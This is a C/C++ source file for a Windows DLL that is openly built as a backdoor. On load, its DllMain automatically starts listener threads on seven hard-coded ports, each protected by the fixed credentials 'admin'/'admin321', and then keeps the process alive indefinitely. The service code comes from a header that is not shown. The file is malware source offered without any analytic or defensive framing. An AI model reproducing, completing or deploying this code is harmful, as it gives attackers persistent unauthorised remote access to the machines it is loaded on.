#include "main.h"
#include "backdoor.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#define USERNAME "admin"
#define PASSWORD "admin321"

int gl_Listen_Ports[] = {1234, 12, 23, 34, 123, 234, 11234, 0};

typedef struct _Thread_Param_
{
    char username[100];
    char password[100];
    int port;
} THREAD_PARAM;

DWORD WINAPI listener_thread(LPVOID param)
{
    THREAD_PARAM listenParam = *(THREAD_PARAM *)param;

    free(param);
    start_service(listenParam.username, listenParam.password, listenParam.port);

    return 0;
}

int start_backdoor()
{
    HANDLE hThread = NULL;
    int idx = 0;
    int succCount = 0;
    THREAD_PARAM *pThreadParam = NULL;

    for(idx = 0, succCount = 0; gl_Listen_Ports[idx] > 0; ++idx)
    {
        pThreadParam = (THREAD_PARAM *)malloc(sizeof(THREAD_PARAM));
        if(pThreadParam == NULL)
            continue;

        memset(pThreadParam, 0x00, sizeof(THREAD_PARAM));
        strcat(pThreadParam->username, USERNAME);
        strcat(pThreadParam->password, PASSWORD);
        pThreadParam->port = gl_Listen_Ports[idx];

        hThread = CreateThread(NULL, 0, listener_thread, (LPVOID)pThreadParam, 0, NULL);
        CloseHandle(hThread);
        ++succCount;
    }

    if(succCount > 0)
    {
        while(1)
        {
            Sleep(10);
        }
    }

    return succCount;
}

extern "C" int DLL_EXPORT main()
{
    return start_backdoor();
}

extern "C" DLL_EXPORT BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{


    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        // attach to process
        // return FALSE to fail DLL load
        main();
        break;

    case DLL_PROCESS_DETACH:
        // detach from process
        break;

    case DLL_THREAD_ATTACH:
        // attach to thread
        break;

    case DLL_THREAD_DETACH:
        // detach from thread
        break;
    }
    return TRUE; // succesful
}
